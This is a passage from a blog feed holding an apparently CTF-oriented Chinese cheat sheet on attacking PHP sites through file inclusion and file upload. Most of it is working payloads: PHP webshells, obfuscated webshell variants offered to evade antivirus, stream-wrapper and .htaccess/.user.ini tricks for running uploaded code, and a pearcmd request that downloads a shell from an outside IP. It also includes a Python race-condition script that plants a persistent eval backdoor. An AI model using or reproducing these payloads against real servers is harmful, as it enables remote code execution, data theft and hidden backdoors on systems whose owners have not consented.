      <tag>web php</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>文件操作篇</title>
    <link href="/2024/09/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E7%AF%87/"/>
    <url>/2024/09/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E7%AF%87/</url>
    
    <content type="html"><![CDATA[<h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><ul><li><code>include()</code> 文件的内容将作为 PHP 代码执行，找不到被包含的文件时只会产生警告，脚本将继续运行。</li><li><code>include_once()</code> 唯一区别是如果该文件中的代码已经被包含，则不会再次包含。</li><li><code>require()</code> 找不到被包含的文件时会产生致命错误，并停止脚本运行。</li><li><code>require_once()</code> 唯一区别是如果该文件中的代码已经被包含，则不会再次包含。</li><li>若文件内容符合 PHP 语法规范，包含时不管扩展名是什么都会被 PHP 解析。若文件内容不符合 PHP 语法规范则会暴露其源码。</li></ul><h1 id="路径问题"><a href="#路径问题" class="headerlink" title="路径问题"></a>路径问题</h1><ul><li><code>.</code>（单个点）：表示当前目录。例如，如果当前目录是 <code>/var/www/html</code>，那么 <code>./phpinfo.txt</code> 就表示 <code>/var/www/html/phpinfo.txt</code>。</li><li><code>..</code>（两个点）：表示上一级目录。例如，如果当前目录是 <code>/var/www/html</code>，那么 <code>../phpinfo.txt</code> 就表示 <code>/var/www/phpinfo.txt</code>。</li><li>如果是 PHP 文件 flag 最好用 base 读，txt 直接包含就行。</li></ul><h1 id="伪协议操作"><a href="#伪协议操作" class="headerlink" title="伪协议操作"></a>伪协议操作</h1><h3 id="file"><a href="#file" class="headerlink" title="file://"></a><code>file://</code></h3><ul><li>条件：<ul><li><code>allow_url_fopen</code>：不受影响</li><li><code>allow_url_include</code>：不受影响</li></ul></li><li>作用：用于访问本地文件系统。</li><li>说明：<ul><li><code>file://</code> 是 PHP 使用的默认封装协议，展现了本地文件系统。当指定了一个相对路径（不以 &#x2F;、\、\ 或 Windows 盘符开头的路径）提供的路径将基于当前的工作目录。在很多情况下是脚本所在的目录，除非被修改了。使用 CLI 的时候，目录默认是脚本被调用时所在的目录。</li><li>在某些函数里，例如 <code>fopen()</code> 和 <code>file_get_contents()</code>，<code>include_path</code> 会可选地搜索，也作为相对的路径。</li></ul></li><li>示例：<ul><li><code>http://127.0.0.1/?filename=file:///etc/passwd</code></li></ul></li></ul><h3 id="php"><a href="#php" class="headerlink" title="php://"></a><code>php://</code></h3><ul><li>条件：<ul><li><code>allow_url_fopen</code>：不受影响</li><li><code>allow_url_include</code>：仅 <code>php://input</code>、<code>php://stdin</code>、<code>php://memory</code>、<code>php://temp</code> 需要 <code>on</code>。</li></ul></li><li>作用：访问各个输入 &#x2F; 输出流（I&#x2F;O streams）</li><li>说明：<ul><li>PHP 提供了一些杂项输入 &#x2F; 输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符，内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。</li><li><code>php://input</code> 可以访问请求的原始数据的只读流。如果启用了 <code>enable_post_data_reading</code> 选项，<code>php://input</code> 在使用 <code>enctype=&quot;multipart/form-data&quot;</code> 的 POST 请求中不可用。</li><li><code>php://output</code> 只写的数据流，允许你以 <code>print</code> 和 <code>echo</code> 一样的方式写入到输出缓冲区。</li><li><code>php://fd</code> (&gt;&#x3D;5.3.6) 允许直接访问指定的文件描述符。例如 <code>php://fd/3</code> 引用了文件描述符 3。</li><li><code>php://memory</code>、<code>php://temp</code> (&gt;&#x3D;5.1.0) 类似文件包装器的数据流，允许读写临时数据。两者的一个区别是 <code>php://memory</code> 总是把数据储存在内存中，而 <code>php://temp</code> 会在内存量达到预定义的限制后（默认是 2MB）存入临时文件中。临时文件位置的决定和 <code>sys_get_temp_dir()</code> 的方式一致。<code>php://temp</code> 的内存限制可通过添加 <code>/maxmemory:NN</code> 来控制，NN 是以字节为单位、保留在内存的最大数据量，超过则使用临时文件。</li><li><code>php://filter/[read|write]=过滤器名称/resource=filename</code><ul><li><code>read</code> 操作：在读取数据时应用过滤器。</li><li><code>write</code> 操作：在写入数据时应用过滤器。</li><li>过滤器：<ul><li><code>string.rot13</code>：对数据进行 ROT13 变换。</li><li><code>string.toupper</code>：将字符串转换为大写。</li><li><code>string.tolower</code>：将字符串转换为小写。</li><li><code>convert.base64-encode</code>：将数据进行 Base64 编码。</li><li><code>convert.base64-decode</code>：将数据进行 Base64 解码。</li><li><code>convert.quoted-printable-encode</code>：将数据进行 Quoted-Printable 编码。</li><li><code>convert.quoted-printable-decode</code>：将数据进行 Quoted-Printable 解码。</li><li><code>convert.iconv.UTF-8/ISO-8859-1</code>：将数据从 UTF-8 编码转换为 ISO-8859-1 编码（iconv 需要安装）。</li><li><code>zlib.deflate</code>：对数据进行 DEFLATE 压缩。</li><li><code>zlib.inflate</code>：对数据进行 DEFLATE 解压缩。</li><li><code>zlib.encode</code>：对数据进行 gzip 编码。</li><li><code>zlib.decode</code>：对数据进行 gzip 解码。</li></ul></li></ul></li><li><code>resource=php://input</code>：读取请求的原始数据。</li><li><code>resource=php://stdin</code>：读取标准输入。</li><li><code>resource=php://stdout</code>：写入标准输出。</li><li><code>resource=php://stderr</code>：写入标准错误输出。</li></ul></li><li>示例：<ul><li><code>file_put_contents(a,b)</code> 将 b 的内容写入 a 中，正好触发了 write</li><li><code>file_get_contents()</code> 直接触发 read</li></ul></li></ul><h3 id="用-phar-协议"><a href="#用-phar-协议" class="headerlink" title="用 phar 协议"></a>用 phar 协议</h3><ul><li>创建一个一句话木马文件 <code>1.php</code>，内容为：<code>&lt;?php @system($_GET[0]);?&gt;</code>。然后压缩成 zip 文件，随后修改后缀名为 <code>.png</code> 或者 <code>.jpg</code>，上传该文件。</li><li>示例：<ul><li><code>?file=phar://upload/1.jpg/1&amp;0=cat%20/f1aaaag</code></li></ul></li></ul><h3 id="用-zip-协议"><a href="#用-zip-协议" class="headerlink" title="用 zip 协议"></a>用 zip 协议</h3><ul><li>压缩成 zip 文件，随后修改后缀名为 <code>.png</code> 或者 <code>.jpg</code>，上传该文件。</li><li>示例：<ul><li><code>?file=zip://upload/1.jpg%231&amp;0=cat /f1aaggggg</code></li></ul></li></ul><h3 id="绕过死亡-die"><a href="#绕过死亡-die" class="headerlink" title="绕过死亡 die"></a>绕过死亡 die</h3><ul><li><p>需要 URL 编码：</p><ul><li><code>GET: ?file=php://filter/write=convert.base64-decode/resource=1.php</code></li><li><code>?file=%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%64%25%36%33%25%36%66%25%36%65%25%37%36%25%36%35%25%37%32%25%37%34%25%32%65%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%34%25%36%35%25%36%33%25%36%66%25%36%34%25%36%35%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%33%31%25%32%65%25%37%30%25%36%38%25%37%30</code></li></ul></li><li><p>需要 base64 编码，编码后最前面添加两个字母如：<code>aa</code>：</p><ul><li><code>POST: content=&lt;?php system(&#39;cat f*&#39;);</code></li><li><code>content=aaPD9waHAgcGhwaW5mbygpOz8+</code></li></ul></li><li><p>或：</p><ul><li>需要 URL 编码：<ul><li><code>GET: ?file=php://filter/write=string.rot13/resource=1.php</code></li><li><code>?file=%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%64%25%37%33%25%37%34%25%37%32%25%36%39%25%36%65%25%36%37%25%32%65%25%37%32%25%36%66%25%37%34%25%33%31%25%33%33%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%33%32%25%32%65%25%37%30%25%36%38%25%37%30</code></li></ul></li></ul></li><li><p>需要 Rot13 编码：</p><ul><li><code>POST: content=&lt;?php system(&#39;cat f*&#39;);</code></li><li><code>content=&lt;?cuc cucvasb();?&gt;</code></li></ul></li><li><p>或：</p><ul><li><code>?file=php://filter/write=string.strip_tags|convert.base64-decode/resource=3.php</code></li><li><code>/?filecode></li><li><code>post传入 &lt;?php phpinfo();</code></li><li><code>PD9waHAgcGhwaW5mbygpOw==</code></li></ul></li><li><p>或：</p><ul><li><code>file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.php</code></li><li><code>post: contents=?&lt;hp pvela$(P_SO[T]1;)&gt;?</code></li></ul><p>利用filter链构造的方式构造任意字符</p><p>​<a href="https://probiusofficial.github.io/PHP-FilterChain-Exploit/">PHP FilterChain 生成器 (probiusofficial.github.io)</a></p></li></ul><h1 id="文件包含配合伪协议"><a href="#文件包含配合伪协议" class="headerlink" title="文件包含配合伪协议"></a>文件包含配合伪协议</h1><ul><li><code>include($file)</code></li><li>示例：<ul><li><code>?file=php://filter/convert.base64-encode/resource=flag.php</code></li><li><code>?file=php://filter/convert.%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%44%25%36%35%25%36%45%25%36%33%25%36%46%25%36%34%25%36%35/resource=flag.php   //二次编码解很多题</code></li><li><code>?data://text/plain,&lt;?php system(&#39;ls&#39;);?&gt;</code></li><li><code>?file=data://text/plain;base64,PD89c3lzdGVtKCd0YWMgZmxhZy5waHAnKTs/Pg==   //&lt;?=system(&#39;tac flag.php&#39;);?&gt;</code></li><li><code>?file=php://filter/convert.iconv.ASCII.UCS-2BE/resource=flag.php</code></li><li><code>?file=compress.zlib:///var/www/html/flag.php</code></li><li><code>compress.zlib://data:@baidu.com/baidu.com,phpinfo() 构造思路：</code>@<code>使</code>data:<code>被解释为用户名和密码 baidu.com/baidu.com 只要它包含了 /，通常被认为是合法的 media-type。作为有效的压缩流，而是将整个 URL 作为字面文本读取了。file_get_contents结果是phpinfo()</code></li><li><code>?file=phar://test.zip/shell.txt   //相对路径 phar把shell.txt压缩成test.zip文件</code></li></ul></li></ul><h1 id="包含-htaccess-文件"><a href="#包含-htaccess-文件" class="headerlink" title="包含 .htaccess 文件"></a>包含 .htaccess 文件</h1><ul><li>示例：<ul><li><code>php_value auto_append_file /tmp/webshell.txt</code></li><li><code>php_value auto_append_file /temp/sess_xxxxxx</code></li><li><code>先执行其他php完再包含/tmp/webshell</code></li><li><code>自己包含自己会将注释句子一起执行</code></li><li><code>php_value auto_append_file .htaccess</code></li><li><code>#&lt;?php echo(123);eval($_POST[0]);?&gt;</code></li></ul></li></ul><h1 id="见到-shtml-考虑-ssi"><a href="#见到-shtml-考虑-ssi" class="headerlink" title="见到 shtml 考虑 ssi"></a>见到 shtml 考虑 ssi</h1><ul><li>示例：<ul><li><code>.htaccess</code></li><li><code>AddType text/html .shtml</code></li><li><code>AddHandler server_parsed .shtml</code></li><li><code>Options Includes</code></li><li><code>1.shtml</code></li><li><code>&lt;pre&gt;</code></li><li><code>&lt;!--#exec cmd=&quot;whomai&quot;--&gt;</code></li><li><code>&lt;/pre&gt;</code></li></ul></li></ul><h1 id="传统条件竞争不可取"><a href="#传统条件竞争不可取" class="headerlink" title="传统条件竞争不可取"></a>传统条件竞争不可取</h1><ul><li>示例：<ul><li><code>条件竞争php7.0</code></li><li><code>file=php://filter/strip_tags/resource=/ect/passwd  会报错不执行</code></li><li><code>post传文件就直接永久保存下来，在phpinfo界面找file包含即可</code></li><li><code>自包含(题中的包含或者.htaccess包含 php_value auto_append_file 1.txt)，上传，phpinfo页面，这几个保证在一个界面，在自包含下给phpinfo界面传文件，</code></li><li><code>自包含shell</code></li><li><code>1.txt</code></li><li><code>&lt;?</code></li><li><code>echo (&#39;1.txt is ready&#39;);</code></li><li><code>file_put_contents(&#39;/tmp/shell.php&#39;,&#39;&lt;?php echo(&#39;haha,is OK&#39;);eval($_POST[0]);?&gt;&#39;);</code></li></ul></li></ul><h1 id="日志文件包含"><a href="#日志文件包含" class="headerlink" title="日志文件包含"></a>日志文件包含</h1><ul><li>示例：<ul><li><code>/var/log/nginx/access.log，利用ua头即可包含</code></li></ul></li></ul><h1 id="包含-environ-文件"><a href="#包含-environ-文件" class="headerlink" title="包含 environ 文件"></a>包含 environ 文件</h1><ul><li>条件：<ul><li><code>php以cgi方式运行，这样environ才会保持UA头。</code></li><li><code>environ文件存储位置已知，且environ文件可读。</code></li><li><code>每个用户都有属于自己的environ环境</code></li></ul></li></ul><h1 id="session-文件包含"><a href="#session-文件包含" class="headerlink" title="session 文件包含"></a>session 文件包含</h1><ul><li>示例：<ul><li><code>能赋值就直接赋值包含</code></li><li><code>不行就进度条</code></li><li><code>/tem/sess_PHPSESSID</code></li><li><code>/var/lib/php/session/sess_PHPSESSID</code></li><li><code>这里的PHPSESSID是cookie当用户控制时（session.use_struct_mode开）随便写入，利用session进度条，利用写的HTML，随便传抓包，确保有Cookie: PHPSESSID=xxxxxxx并找到其位置  /sess_xxxxxx</code></li><li><code>默认是一直删除，所以一直重发session页面的包，并且一直重发包含session文件的页面包含进去</code></li></ul></li></ul><h1 id="pear-文件包含"><a href="#pear-文件包含" class="headerlink" title="pear 文件包含"></a>pear 文件包含</h1><ul><li>条件：<ul><li><code>1 有文件包含点</code></li><li><code>2 开启了pear扩展</code></li><li><code>3 配置文件中register_argc_argv 设置为On,而默认为Off</code></li></ul></li><li>说明：<ul><li><code>PEAR扩展</code></li><li><code>PHP Extension and Application Repository</code></li><li><code>默认安装位置是  /usr/local/lib/php/</code></li><li><code>包含测试?file=/usr/local/lib/php/pearcmd.php&amp;version</code></li></ul></li><li>利用 Pear 扩展进行文件包含<ul><li>page参数存在文件包含，题目提示很明显，register_argc_argv，所以打pearcmd包含</li><li>方法一 远程文件下载<ul><li>示例：<ul><li><code>?file=/usr/local/lib/php/pearcmd.php&amp;ctfshow+install+-R+/var/www/html/+http://47.236.120.83/shell.php  //shell密码是cmd</code></li></ul></li></ul></li><li>方法二 生成配置文件，配置项传入我们恶意的php代码的形式<ul><li>上传 <code>ctfshow.php</code><ul><li>示例：<ul><li><code>a=b</code></li><li><code>username=root</code></li><li><code>man_dir=&lt;?php eval($_POST[1]);?&gt;</code></li></ul></li><li>示例：<ul><li><code>GET /?file=/usr/local/lib/php/pearcmd.php&amp;+-c+/tmp/ctf.php+-d+man_dir=&lt;?eval($_POST[1]);?&gt;+-s+</code></li></ul></li><li>然后直接利用密码是1</li><li>?page&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;pearcmd.php&amp;+config-create+&#x2F;tmp&#x2F;<?=system('/readflag')?>&#x2F;*+&#x2F;tmp&#x2F;pwn.php</li><li>之后访问?page&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;pwn.php</li></ul></li></ul></li><li>方法三 写配置文件方式<ul><li>示例：<ul><li><code>GET /?file=/usr/local/lib/php/pearcmd.php&amp;aaaa+config-create+/var/www/html/&lt;?=</code>$_POST[1]<code>;?&gt;+1.php</code></li><li>访问 <code>http://&lt;靶场服务器IP&gt;/1.php</code></li></ul></li></ul></li></ul></li></ul><h1 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h1><ul><li>说明：<ul><li>通过域转数字的形式，可以不用.来构造远程文件地址</li><li>示例：<ul><li><code>http://www.msxindl.com/tools/ip/ip_num.asp</code></li><li><code>?file=http://731540450/1</code></li></ul></li></ul></li></ul><h1 id="open-basedir-突破"><a href="#open-basedir-突破" class="headerlink" title="open_basedir 突破"></a>open_basedir 突破</h1><ul><li>说明：<ul><li>利用闭合直接 <code>glob</code> 获取根目录的文件名</li><li>示例：<ul><li><code>?&gt;&lt;?php</code></li><li><code>var_dump(scandir(&#39;glob:///*&#39;));?&gt;</code></li></ul></li></ul></li><li>或者利用 <code>glob+DirectoryIterator</code> 获取根目录的文件名，新建 <code>glob.php</code> 文件，内容如下<ul><li>示例：<ul><li><code>&lt;?php</code></li><li><code>$it = new DirectoryIterator(&quot;glob:///*&quot;);</code></li><li><code>foreach($it as $f) &#123;</code></li><li><code>echo $f-&gt;__toString().&quot;&lt;br/&gt;&quot;;</code></li><li><code>&#125;</code></li><li><code>直接通过蚁剑链接，将glob.php上传再访问找到flag名</code></li></ul></li></ul></li><li>利用 <code>ini_set、mkdir、chdir</code> 来获取文件内容，新建 <code>flag.php</code> 文件，内容如下<ul><li>示例：<ul><li><code>&lt;?php</code></li><li><code>mkdir(&#39;tmpdir&#39;); chdir(&#39;tmpdir&#39;);</code></li><li><code>ini_set(&#39;open_basedir&#39;,&#39;..&#39;);</code></li><li><code>chdir(&#39;..&#39;); chdir(&#39;..&#39;); chdir(&#39;..&#39;); chdir(&#39;..&#39;); chdir(&#39;..&#39;);</code></li><li><code>ini_set(&#39;open_basedir&#39;,&#39;/&#39;);</code></li><li><code>$a=file_get_contents(&#39;/f11aggg&#39;);</code></li><li><code>var_dump($a);</code></li><li><code>?&gt;</code></li><li>访问即可得到flag</li></ul></li></ul></li></ul><h1 id="nginx-大文件上传缓存文件利用"><a href="#nginx-大文件上传缓存文件利用" class="headerlink" title="nginx 大文件上传缓存文件利用"></a>nginx 大文件上传缓存文件利用</h1><h1 id="pcache-扩展生成缓存文件利用"><a href="#pcache-扩展生成缓存文件利用" class="headerlink" title="pcache 扩展生成缓存文件利用"></a>pcache 扩展生成缓存文件利用</h1><ul><li>有任意文件读取，前面双写绕过&#x2F;.的过滤</li><li>示例：<ul><li><code>/?tpl=...//...//...//...//...//...//...//...//etc/passwd</code></li></ul></li><li>flag 在 <code>flag.php</code> 里，源码对最后一个.后的后缀名进行判断，无法直接绕过读取flag.php，查看phpinfo</li><li>示例：<ul><li><code>/?tpl=debug</code></li><li><code>发现开启了opcache，它会缓存php文件进入指定缓存文件夹，路径为缓存文件夹/[system_id]/var/www/html/flag.php.bin</code></li><li>只要访问这个bin文件即可绕过后缀过滤，查看phpinfo发现缓存文件夹为 <code>/var/www/a/</code></li><li>主要是计算 <code>system_id</code>，有现成工具 <code>php7-opcache-override(https://github.com/GoSecure/php7-opcache-override)</code></li><li><code>用法：</code><ul><li><code>python3 system_id_scraper.py info.html 或者 python3 system_id_scraper.py url</code></li><li><code># info.html为phpinfo的前端信息界面另存为所得</code></li><li><code># url为phpinfo地址</code></li><li>示例：<ul><li><code>算出system_id为1116d566fdc53f79abce6c01e3a0308d</code></li><li><code>所以先访问flag.php使其产生缓存文件（这一步必须要），之后执行访问如下进行包含即可</code></li><li><code>/?tpl=...//...//...//...//...//...//...//...//var/www/a/1116d566fdc53f79abce6c01e3a0308d/var/www/html/flag.php.bin</code></li><li><code>#flag&#123;Opcache_Succ_ess!!&#125;</code></li></ul></li></ul></li></ul></li></ul><hr><h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><h2 id=""><a href="#" class="headerlink" title="&lt;?php 的绕过"></a><code>&lt;?php</code> 的绕过</h2><ul><li>示例：<ul><li><code>&lt;?=</code> </li><li><code>&lt;script language=&#39;php&#39;&gt;phpinfo();&lt;/script&gt;</code></li><li><code>&lt;% phpinfo();%&gt; //asp tag少</code></li></ul></li><li>思路是找过滤，是内容还是后缀，是白还是黑</li></ul><h2 id="前端-js-检查"><a href="#前端-js-检查" class="headerlink" title="前端 js 检查"></a>前端 js 检查</h2><ul><li>示例：<ul><li>后改为 bp</li><li>图片头 <code>GIF89A</code> 为第一行</li><li>加入带马的图片</li></ul></li></ul><h3 id="shell-总结"><a href="#shell-总结" class="headerlink" title="shell 总结"></a>shell 总结</h3><ul><li>示例：<ul><li><code>&lt;?echo (&#39;123&#39;);eval($_POST[0]);?&gt;</code></li><li><code>&lt;?=eval($_POST&#123;1&#125;);?&gt; //过滤[]</code></li><li><code>&lt;?=system(&#39;tac ../f*&#39;)?&gt; //过滤&#123;&#125;[]</code></li><li><code>&lt;script language=”php”&gt;echo &#39;123&#39;; &lt;/script&gt;</code></li><li><code>&lt;?= eval(array_pop($_REQUEST))?&gt;</code></li><li><code>&lt;?= @eval(array_pop($_POST))?&gt; //传1=system(&#39;ls /&#39;)</code></li><li>上传完shell无论是jpg还是php直接包含</li><li>示例：<ul><li><code>?file=upload/1.jpg&amp;0=tac%20Flag_is_here_acffd72.php</code></li></ul></li></ul></li></ul><h2 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h2><ul><li>示例：<ul><li><code>利用fuzz方法快速测试可上传后缀：upload-fuzz-dic-builder()</code></li><li>项目地址：<a href="https://github.com/c0ny1/upload-fuzz-dic-builder">https://github.com/c0ny1/upload-fuzz-dic-builder</a></li><li>用法：<code>python2 upload-fuzz-dic-builder.py -n shell -a jpg  -l php -m apache --os linux  -o upload_file.txt</code></li><li>双写：<ul><li>php后缀名大小写、点绕过、空格绕过、::$DATA绕过、冒号绕过（Windows特性）</li><li>php支持的可解析别名：php2, php3, php4, php5, phps, pht, phtm, phtml</li></ul></li></ul></li><li><code>.user.ini</code> 上传，先发图片再改为这个 <code>.user.ini</code> 名字<ul><li>但是这种方式其实是有个前提的，因为 <code>.user.ini</code> 只对他同一目录下的文件起作用，也就是说，只有他同目录下有php文件才可以。</li><li>示例：<ul><li><code>1.写入内容auto_prepend_file=1.txt 再上传1.txt的马不行就写&lt;?=eval($_COOKIE[1]); 传COOKIE：1=eval(base64_decode(&#39;cGhwaW5mbygpOw==&#39;))?&gt;</code></li><li><code>2.写入内容auto_prepend_file=php://input</code></li><li><code>上传完直接随便发个东西在bp直接传码就行</code></li><li><code>3.写入内容auto_prepend_file=/var/log/nginx/access.log</code></li><li><code>上传后ua写码&lt;?php eval($_POST[1]);?&gt;木马，插入日志后就不写ua头直接rce就行，POST不行就COOKIE&lt;?php eval($_COOKIE[1]);?&gt; 1=eval(base64_decode(&#39;&#39;))?&gt;COOKIE不解析空格</code></li><li><code>4..user.ini写入内容</code></li><li><code>GIF89a</code></li><li><code>auto_prepend_file=/tmp/sess_shell</code></li><li><code>用session进度条post发包并拦截，马是&lt;?php @eval($_POST[&quot;pass&quot;]);?&gt;</code></li><li><code>改Cookie:PHPSESSID=shell,在PHP_SESSION_UPLOAD_PROGRESS的主体的最后一行写&lt;?php fwrite(fopen(&#39;1.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[&quot;pass&quot;]);?&gt;&#39;);?&gt;</code></li><li><code>将该POST数据包与访问upload目录的GET数据包进行条件竞争，访问upload的数据包长度发生变化即创建后门文件成功</code></li></ul></li></ul></li><li><code>.htaccess</code> 文件<ul><li>方式1：<ul><li><code>AddType application/x-httpd-php .png   //将.png后缀的文件解析 成php</code></li><li>还支持 <code>AddType application/x-httpd-ph\p .png</code></li></ul></li><li>方式2：<ul><li><code>&lt;FilesMatch &quot;png&quot;&gt;</code></li><li><code>SetHandler application/x-httpd-php</code></li><li><code>&lt;/FilesMatch&gt;</code></li><li>如果flag不是php文件，那么还可以像 <code>.user.ini</code> 一样在当前目录加载一个文件</li><li>示例：<ul><li><code>php_value auto_append_file &#39;flag&#39;</code></li></ul></li></ul></li><li>基于 <code>.htaccess</code> 的盲注</li></ul></li></ul><h2 id="基础免杀"><a href="#基础免杀" class="headerlink" title="基础免杀"></a>基础免杀</h2><ul><li>示例：<ul><li><code>&lt;?php</code></li><li><code>$a = &quot;s#y#s#t#e#m&quot;;</code></li><li><code>$b = explode(&quot;#&quot;,$a);</code></li><li><code>$c = $b[0].$b[1].$b[2].$b[3].$b[4].$b[5];</code></li><li><code>$c($_REQUEST[1]);</code></li><li><code>?&gt;</code></li></ul></li><li>示例：<ul><li><code>&lt;?php</code></li><li><code>$a=substr(&#39;1s&#39;,1).&#39;ystem&#39;;</code></li><li><code>$a($_REQUEST[1]);</code></li><li><code>?&gt;</code></li></ul></li><li>示例：<ul><li><code>&lt;?php</code></li><li><code>$a=strrev(&#39;metsys&#39;);</code></li><li><code>$a($_REQUEST[1]);</code></li><li><code>?&gt;</code></li></ul></li><li>示例：<ul><li><code>&lt;?php</code></li><li><code>$a=$_REQUEST[&#39;a&#39;];</code></li><li><code>$b=$_REQUEST[&#39;b&#39;];</code></li><li><code>$a($b);</code></li><li><code>?&gt;</code></li></ul></li><li>图像检测函数<ul><li><code>mime_content_type</code></li><li><code>getimagesize和exif_imagetype函数</code><ul><li>以上3个函数都是通过检查文件的幻数判断文件的类别。可以直接下列命令制作后门jpg文件进行绕过。</li><li>示例：<ul><li><code>打开 cmd，导航到包含 safe.jpg 和 shell.php 文件的目录，然后运行命令</code></li><li><code>copy safe.jpg /b + shell.php /a shell.jpg</code></li></ul></li></ul></li></ul></li></ul><h2 id="文件移动函数"><a href="#文件移动函数" class="headerlink" title="文件移动函数"></a>文件移动函数</h2><ul><li>示例：<ul><li><code>move_uploaded_file函数会忽略掉文件末尾的/.</code></li></ul></li></ul><h2 id="白名单"><a href="#白名单" class="headerlink" title="白名单"></a>白名单</h2><ul><li>示例：<ul><li><code>IIS5.X/6.0</code><ul><li><code>目录解析：如果目录采取/1.asp/的命令方式，那么访问该目录下的文件会默认以asp的方式执行</code></li><li><code>文件解析：iis读取到;会默认结束，可以用1.asp;.jpg的形式进行绕过</code></li><li><code>特殊后缀：1.asa、1.cer、1.cdx</code></li></ul></li><li><code>IIS7/7.5</code><ul><li>如果配置中开启 <code>cgi.fix_pathinf</code></li><li>同 <code>nginx</code> 解析漏洞</li></ul></li><li><code>Apache解析漏洞</code><ul><li><code>解析漏洞:从右到左判断后缀并解析（低版本）</code></li><li><code>123.php.asaa：Apache会先判断asaa不认识，那就会判断.php它认识就默认以这种方式进行解析。</code></li></ul></li><li><code>Apache HTTPD 换行解析漏洞（CVE-2017-15715）</code><ul><li>示例：<ul><li><code>shell.php%0a</code></li></ul></li></ul></li><li><code>Nginx解析漏洞</code><ul><li>示例：<ul><li><code>hack.jpg/1.php</code></li><li><code>nginx看到文件扩展名是.php，便不管该文件是否存在，直接交给php处理，然后php的默认配置下看到右边的文件不存在，便删去最后的文件名，读取前一个，所以将.jpg处理成为php</code></li></ul></li></ul></li><li><code>nginx 文件名逻辑漏洞（CVE-2013-4547）</code><ul><li>示例：<ul><li><code>shell.gif[0x20][0x00].php</code></li></ul></li></ul></li><li><code>Windows环境</code><ul><li>示例：<ul><li><code>shell.php.jpg</code></li><li><code>此时目录中会生成shell.php文件，但内容为空。再利用PHP和Windows环境的叠加属性：</code></li><li><code>再上传shell.&gt;&gt;&gt;来匹配并覆盖shell.php</code></li><li><code>shell.php::$DATA</code></li><li><code>shell.php </code>（php后有个空格）</li><li><code>shell.php.</code></li></ul></li></ul></li><li><code>shell.phtml</code></li><li><code>shell.php%00</code></li><li><code>shell.gif[0x20][0x00].php</code></li><li><code>shell.php.jpg</code></li><li><code>shell.pphphp</code></li><li><code>shell.PHP</code></li><li><code>shell.php.jpg</code></li></ul></li></ul><h2 id="竞争上传"><a href="#竞争上传" class="headerlink" title="竞争上传"></a>竞争上传</h2><ul><li>示例：<ul><li><code>先移动，后检测，不符合再删除，符合则改名字</code></li><li><code>使用多线程并发进行上传与访问操作</code></li><li><code>查看源代码发现只能上传zip那我们直接上传一句话就可以了注意修改Content-Type为application/x-zip-compressed</code></li><li><code>然后直接文件包含就可以了</code></li></ul></li></ul><h2 id="条件竞争绕过"><a href="#条件竞争绕过" class="headerlink" title="条件竞争绕过"></a>条件竞争绕过</h2><ul><li><h2 id="示例：-查看页面源代码，明显的条件竞争，新建一个文件shell-php，内容如下-执行如下脚本进行竞争上传"><a href="#示例：-查看页面源代码，明显的条件竞争，新建一个文件shell-php，内容如下-执行如下脚本进行竞争上传" class="headerlink" title="示例：- 查看页面源代码，明显的条件竞争，新建一个文件shell.php，内容如下  - &lt;?php fputs(fopen(&quot;info.php&quot;, &quot;w&quot;), &#39;&lt;?php @eval($_POST[&quot;key&quot;]);?&gt;&#39;); ?&gt;- 执行如下脚本进行竞争上传"></a>示例：<br>- <code>查看页面源代码，明显的条件竞争，新建一个文件shell.php，内容如下</code><br>  - <code>&lt;?php fputs(fopen(&quot;info.php&quot;, &quot;w&quot;), &#39;&lt;?php @eval($_POST[&quot;key&quot;]);?&gt;&#39;); ?&gt;</code><br>- 执行如下脚本进行竞争上传</h2><ul><li><pre><code class="py"># -*- coding:utf-8 -*-import requestsimport threadingimport osclass RaceCondition(threading.Thread):    def __init__(self):        threading.Thread.__init__(self)        self.url = &#39;http://192.168.13.140:8011/uploads/shell.php&#39; #上传的文件地址        self.uploadUrl = &#39;http://192.168.13.140:8011/index.php&#39; #上传文件的地址    def _get(self):        print(&#39;try to call uploaded file...&#39;)        r = requests.get(self.url)        if r.status_code == 200:            print(&#39;[*] create file info.php success.&#39;)            os._exit(0)    def _upload(self):        print(&#39;upload file...&#39;)        file = &#123;&#39;myfile&#39;: open(&#39;shell.php&#39;, &#39;r&#39;)&#125; #本地脚本木马        requests.post(self.uploadUrl, files=file)    def run(self):        while True:            for i in range(5):                self._get()            for i in range(10):                self._upload()                self._get()if __name__ == &#39;__main__&#39;:    threads = 50        for i in range(threads):        t = RaceCondition()        t.start()    for i in range(threads):        t.join() </code></pre></li><li><p><code>成功后访问./uploads/info.php</code></p></li></ul></li></ul><hr><h1 id="phpinfo-页面"><a href="#phpinfo-页面" class="headerlink" title="phpinfo 页面"></a>phpinfo 页面</h1><ul><li>PHP 版本信息<ul><li>重要性: 